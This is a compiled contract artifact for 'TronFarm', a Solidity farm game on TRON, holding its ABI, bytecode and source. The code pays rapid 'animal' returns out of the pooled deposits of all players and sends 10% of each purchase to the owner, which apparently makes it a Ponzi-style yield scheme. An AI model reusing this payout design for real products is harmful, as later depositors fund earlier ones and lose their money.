{
  "contractName": "TronFarm",
  "abi": [
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "allPlayers",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalPayout",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalInvested",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalAnimals",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "players",
      "outputs": [
        {
          "name": "coinsReturned",
          "type": "uint256"
        },
        {
          "name": "usedCoins",
          "type": "uint256"
        },
        {
          "name": "allCoins",
          "type": "uint256"
        },
        {
          "name": "time",
          "type": "uint256"
        },
        {
          "name": "coe",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalPlayers",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "deposit",
      "outputs": [
        {
          "name": "success",
          "type": "bool"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_type",
          "type": "uint256"
        },
        {
          "name": "_number",
          "type": "uint256"
        }
      ],
      "name": "buy",
      "outputs": [
        {
          "name": "success",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_coins",
          "type": "uint256"
        }
      ],
      "name": "withdraw",
      "outputs": [
        {
          "name": "success",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getAllPlayers",
      "outputs": [
        {
          "name": "",
          "type": "address[]"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "animalsOf",
      "outputs": [
        {
          "name": "",
          "type": "uint256[5]"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_per",
          "type": "uint256"
        }
      ],
      "name": "setCoe",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260a06040519081016040528061168062ffffff168152602001612df062ffffff168152602001615dc062ffffff16815260200161ef1062ffffff1681526020016204c2c062ffffff1681525060009060056200006292919062000133565b5060a060405190810160405280601961ffff168152602001603261ffff168152602001606461ffff16815260200160fa61ffff1681526020016104e261ffff168152506005906005620000b79291906200017f565b506001600a556064600b55348015620000cf57600080fd5b50d38015620000dd57600080fd5b50d28015620000eb57600080fd5b5033601160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550620001f2565b82600581019282156200016c579160200282015b828111156200016b578251829062ffffff1690559160200191906001019062000147565b5b5090506200017b9190620001ca565b5090565b8260058101928215620001b7579160200282015b82811115620001b6578251829061ffff1690559160200191906001019062000193565b5b509050620001c69190620001ca565b5090565b620001ef91905b80821115620001eb576000816000905550600101620001d1565b5090565b90565b610e0a80620002026000396000f3006080604052600436106100ba576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630544ce5e146100bf5780632e1a7d4d14610146578063454f7b8f146101a55780635216aeec146101ea5780636a0ec9251461022f5780639e8db9a614610274578063c6a451521461030d578063d0e30db014610354578063d6febde814610376578063e2eb41ff146103df578063efa1c4821461046c578063f60cdcf6146104f2575b600080fd5b3480156100cb57600080fd5b50d380156100d857600080fd5b50d280156100e557600080fd5b5061010460048036038101908080359060200190929190505050610537565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561015257600080fd5b50d3801561015f57600080fd5b50d2801561016c57600080fd5b5061018b60048036038101908080359060200190929190505050610575565b604051808215151515815260200191505060405180910390f35b3480156101b157600080fd5b50d380156101be57600080fd5b50d280156101cb57600080fd5b506101d4610682565b6040518082815260200191505060405180910390f35b3480156101f657600080fd5b50d3801561020357600080fd5b50d2801561021057600080fd5b50610219610688565b6040518082815260200191505060405180910390f35b34801561023b57600080fd5b50d3801561024857600080fd5b50d2801561025557600080fd5b5061025e61068e565b6040518082815260200191505060405180910390f35b34801561028057600080fd5b50d3801561028d57600080fd5b50d2801561029a57600080fd5b506102cf600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610694565b6040518082600560200280838360005b838110156102fa5780820151818401526020810190506102df565b5050505090500191505060405180910390f35b34801561031957600080fd5b50d3801561032657600080fd5b50d2801561033357600080fd5b5061035260048036038101908080359060200190929190505050610721565b005b61035c6107cf565b604051808215151515815260200191505060405180910390f35b34801561038257600080fd5b50d3801561038f57600080fd5b50d2801561039c57600080fd5b506103c560048036038101908080359060200190929190803590602001909291905050506108e8565b604051808215151515815260200191505060405180910390f35b3480156103eb57600080fd5b50d380156103f857600080fd5b50d2801561040557600080fd5b5061043a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610acf565b604051808681526020018581526020018481526020018381526020018281526020019550505050505060405180910390f35b34801561047857600080fd5b50d3801561048557600080fd5b50d2801561049257600080fd5b5061049b610b05565b6040518080602001828103825283818151815260200191508051906020019060200280838360005b838110156104de5780820151818401526020810190506104c3565b505050509050019250505060405180910390f35b3480156104fe57600080fd5b50d3801561050b57600080fd5b50d2801561051857600080fd5b50610521610b93565b6040518082815260200191505060405180910390f35b60108181548110151561054657fe5b906000526020600020016000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000808211151561058557600080fd5b61058e33610b99565b601260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015482111515156105df57600080fd5b81601260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015403601260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020181905550610678336130d48402610cdc565b5060019050919050565b600f5481565b600d5481565b600e5481565b61069c610dbb565b601260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600401600580602002604051908101604052809291908260058015610715576020028201915b815481526020019060010190808311610701575b50505050509050919050565b6000601260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905061076d33610b99565b60008211151561077c57600080fd5b8060020154600a5483021115151561079357600080fd5b606981600901548301111515156107a957600080fd5b600a54820281600201540381600201819055508181600901540181600901819055505050565b60008060006130d434101515156107e557600080fd5b601260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000209150816002015490506130d43481151561083a57fe5b04810182600201819055506000826003015414156108df57428260030181905550600c60008154809291906001019190505550600b54826009018190555060103390806001815401808255809150509060018203906000526020600020016000909192909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505b60019250505090565b60008060006005851080156108fd5750600084115b151561090857600080fd5b61091133610b99565b8360008660058110151561092157fe5b0154029150601260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090508060020154821115151561097a57600080fd5b8181600201540381600201819055508181600101540181600101819055508381600401866005811015156109aa57fe5b01540181600401866005811015156109be57fe5b0181905550600a828115156109cf57fe5b0460126000601160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201540160126000601160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201819055506009600a83811515610aac57fe5b0402600d5401600d8190555083600e5401600e8190555060019250505092915050565b60126020528060005260406000206000915090508060000154908060010154908060020154908060030154908060090154905085565b60606010805480602002602001604051908101604052809291908181526020018280548015610b8957602002820191906000526020600020905b8160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019060010190808311610b3f575b5050505050905090565b600c5481565b600080600080601260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020935060008460030154111515610bf357600080fd5b60003073ffffffffffffffffffffffffffffffffffffffff163110151515610c1a57600080fd5b607884600301544203811515610c2c57fe5b0492506000831115610cd557600090505b6005811015610c7c57600581600581101515610c5557fe5b01548460040182600581101515610c6857fe5b015402820191508080600101915050610c3d565b6064846009015483850202811515610c9057fe5b0484600001540184600001819055506064846009015483850202811515610cb357fe5b0484600201540184600201819055506078830284600301540184600301819055505b5050505050565b60008060008084118015610d1d5750600073ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff1614155b15610db2573073ffffffffffffffffffffffffffffffffffffffff163191506000821115610db157818411610d525783610d54565b815b905080600f5401600f819055503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610da7573d6000803e3d6000fd5b5060019250610db3565b5b5b505092915050565b60a0604051908101604052806005906020820280388339808201915050905050905600a165627a7a72305820047457e4d216d5ae0348ae059a95900d09961b1c9afd7ee596d74b1b4dc819750029",
  "source": "pragma solidity ^0.4.23;\r\n\r\ncontract TronFarm {\r\n\r\n    uint constant coinPrice = 12500;\r\n    uint constant animals = 5;\r\n    uint constant period = 2 minutes;\r\n\r\n    uint[animals] prices = [5760, 11760, 24000, 61200, 312000];\r\n    uint[animals] profit = [25, 50, 100, 250, 1250];\r\n    uint perPrice = 1;\r\n    uint startCoe = 100;\r\n\r\n    uint public totalPlayers;\r\n    uint public totalInvested;\r\n    uint public totalAnimals;\r\n    uint public totalPayout;\r\n    address[] public allPlayers;\r\n\r\n     address owner;\r\n\r\n    struct Player {\r\n        uint coinsReturned;\r\n        uint usedCoins;\r\n        uint allCoins;\r\n        uint time;\r\n        uint[animals] Animals;\r\n        uint coe;\r\n    }\r\n\r\n    mapping(address => Player) public players;\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function deposit() public payable returns(bool success){\r\n        require(msg.value >= coinPrice);\r\n\r\n        Player storage player = players[msg.sender];\r\n        uint startCoins = player.allCoins;\r\n        player.allCoins = startCoins + (msg.value / coinPrice);\r\n\r\n        if (player.time == 0) {\r\n            player.time = now;\r\n            totalPlayers++;\r\n            player.coe = startCoe;\r\n            allPlayers.push(address(msg.sender));\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function buy(uint _type, uint _number) public returns(bool success){\r\n        require(_type < animals && _number > 0);\r\n        collect(msg.sender);\r\n\r\n        uint paymentCoins = prices[_type] * _number;\r\n        Player storage player = players[msg.sender];\r\n\r\n        require(paymentCoins <= player.allCoins);\r\n        player.allCoins = player.allCoins - paymentCoins;\r\n        player.usedCoins = player.usedCoins + paymentCoins;\r\n\r\n        player.Animals[_type] = player.Animals[_type] + _number;\r\n        players[owner].allCoins = players[owner].allCoins +  (paymentCoins / 10);\r\n        totalInvested = totalInvested + (paymentCoins / 10 * 9);\r\n\r\n        totalAnimals = totalAnimals + _number;\r\n        return true;\r\n    }\r\n\r\n    function withdraw(uint _coins) public returns (bool success){\r\n        require(_coins > 0);\r\n        collect(msg.sender);\r\n        require(_coins <= players[msg.sender].allCoins);\r\n\r\n        players[msg.sender].allCoins = players[msg.sender].allCoins - _coins;\r\n        transfer(msg.sender, _coins * coinPrice);\r\n        return true;\r\n     }\r\n\r\n    function collect(address _addr) internal {\r\n        Player storage player = players[_addr];\r\n        require(player.time > 0);\r\n        require(address(this).balance >= 0);\r\n\r\n        uint hoursAdded = (now - player.time) / period;\r\n        if (hoursAdded > 0) {\r\n            uint hourlyProfit;\r\n            for (uint i = 0; i < animals; i++) {\r\n                hourlyProfit = hourlyProfit + (player.Animals[i] * profit[i]);\r\n            }\r\n            player.coinsReturned = player.coinsReturned + (hoursAdded * hourlyProfit * player.coe / 100);\r\n            player.allCoins = player.allCoins + (hoursAdded * hourlyProfit * player.coe / 100);\r\n            player.time = player.time + (hoursAdded * period);\r\n        }\r\n    }\r\n\r\n    function transfer(address _to, uint _amount) internal returns(bool success){\r\n        if (_amount > 0 && _to != address(0)) {\r\n            uint contractBalance = address(this).balance;\r\n            if (contractBalance > 0) {\r\n                uint payout = _amount > contractBalance ? contractBalance : _amount;\r\n                totalPayout = totalPayout + payout;\r\n                msg.sender.transfer(payout);\r\n                return true;\r\n            }\r\n        }\r\n    }\r\n\r\n    function getAllPlayers()public view returns(address[]){\r\n        return allPlayers;\r\n    }\r\n\r\n    function animalsOf(address _addr) public view returns (uint [animals]) {\r\n        return players[_addr].Animals;\r\n    }\r\n\r\n    function setCoe(uint _per) public{\r\n        Player storage player = players[msg.sender];\r\n        collect(msg.sender);\r\n\r\n        require(_per > 0);\r\n        require(_per * perPrice <= player.allCoins);\r\n        require(_per + player.coe <= 105);\r\n        player.allCoins = player.allCoins - (_per * perPrice);\r\n\r\n        player.coe = player.coe + _per;\r\n    }\r\n\r\n}\r\n",
  "sourcePath": "D:\\work\\ProjectForEverybody\\Tron-Farm\\Tron-Farm\\contracts\\TronFarm.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.69a1e720.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2019-07-08T10:52:57.089Z"
}